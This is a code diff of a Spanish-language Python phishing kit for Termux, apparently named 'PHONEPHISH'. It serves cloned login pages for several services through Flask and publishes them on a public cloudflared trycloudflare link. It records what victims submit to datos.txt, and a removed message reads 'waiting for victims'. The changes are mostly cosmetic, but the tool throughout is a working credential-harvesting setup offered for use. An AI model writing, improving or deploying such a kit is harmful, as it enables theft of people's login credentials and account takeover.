@@ -20,21 +20,20 @@ SERVICIOS = {
 def banner():
     os.system('clear')
     print(r"""
-  _____   _____   _____  __  __ _____ 
- |  __ \ / ____| |  __ \|  \/  |  __ \
- | |__) | |      | |  | | \  / | |  | |
- |  ___/| |      | |  | | |\/| | |  | |
- | |    | |____  | |__| | |  | | |__| |
- |_|     \_____| |_____/|_|  |_|_____/ 
+  _____  _    _  ____  _   _ ______ _____  _    _ _____  _____ _    _ 
+ |  __ \| |  | |/ __ \| \ | |  ____|  __ \| |  | |_   _|/ ____| |  | |
+ | |__) | |__| | |  | |  \| | |__  | |__) | |__| | | | | (___ | |__| |
+ |  ___/|  __  | |  | | . ` |  __| |  ___/|  __  | | |  \___ \|  __  |
+ | |    | |  | | |__| | |\  | |____| |    | |  | |_| |_ ____) | |  | |
+ |_|    |_|  |_|\____/|_| \_|______|_|    |_|  |_|_____|_____/|_|  |_|
     """)
     print("\033[1;37m  ──────────────────────────────────────────")
-    print("\033[1;31m  [>] MODO: TERMUX ANDROID | PORT: 5000")
+    print("\033[1;31m  [>] MODO: TERMUX | PUERTO: 5000")
     print("\033[1;37m  ──────────────────────────────────────────\033[0m")
 
 def iniciar_servidor(plantilla, url_real):
     app = Flask(__name__)
     
-    # Silenciar logs innecesarios de Flask
     import logging
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
@@ -56,9 +55,9 @@ def iniciar_servidor(plantilla, url_real):
     app.run(port=5000, debug=False, use_reloader=False)
 
 def ejecutar_tunel():
-    print("\033[1;33m[*] Iniciando tunel remoto...\033[0m")
+    print("\033[1;33m[*] Iniciando túnel remoto...\033[0m")
     
-    # COMANDO SOLICITADO PARA TERMUX
+    # COMANDO EXACTO SOLICITADO PARA TERMUX
     comando = "cloudflared tunnel --url localhost:5000"
     
     proceso = subprocess.Popen(
@@ -70,29 +69,26 @@ def ejecutar_tunel():
     )
 
     link = None
-    # Leer la salida para extraer el link de trycloudflare
+    # Captura del link trycloudflare
     for _ in range(60): 
         linea = proceso.stderr.readline()
         match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', linea)
         if match:
             link = match.group(0)
             print(f"\n\033[1;32m[+] LINK PUBLICO: \033[1;37m{link}\033[0m")
-            print("\033[1;36m[*] Esperando victimas... (No cierres la app)\033[0m")
             break
         sleep(0.2)
     
     if not link:
-        print("\033[1;31m[!] Error: No se obtuvo el link. ¿Instalaste cloudflared?\033[0m")
+        print("\033[1;31m[!] Error: No se pudo generar el link. Verifica tu conexión.\033[0m")
     
     return proceso
 
 def menu():
     while True:
         banner()
-        keys = list(SERVICIOS.keys())
-        for i in range(len(keys)):
-            id_s = keys[i]
-            print(f"  [{id_s}] {SERVICIOS[id_s][0]}")
+        for id_s, (nombre, _) in SERVICIOS.items():
+            print(f"  [{id_s}] {nombre}")
         
         print("\n  [00] Ver Datos  [x] Salir")
         op = input("\n\033[1;32mSeleccione: \033[0m").strip()
@@ -102,7 +98,6 @@ def menu():
         if op == "00":
             if os.path.exists('datos.txt'):
                 with open('datos.txt', 'r') as f: print("\n" + f.read())
-            else: print("\nNo hay datos registrados.")
             input("\nPresiona Enter para continuar...")
             continue
 
@@ -110,17 +105,17 @@ def menu():
             nombre, url = SERVICIOS[op]
             plantilla = f"{nombre.lower()}.html"
             
-            # Iniciar Flask
+            # Lanzar servidor
             threading.Thread(target=iniciar_servidor, args=(plantilla, url), daemon=True).start()
             sleep(1.5)
             
-            # Iniciar Tunel
+            # Lanzar túnel con el comando solicitado
             proc_cf = ejecutar_tunel()
             
-            input("\n\033[1;33mPresiona ENTER para detener el tunel y volver...\033[0m")
+            input("\n\033[1;33mPresiona ENTER para volver al menú...\033[0m")
             proc_cf.terminate()
-            print("[*] Tunel detenido.")
             sleep(1)
 
 if __name__ == '__main__':
     menu()
+
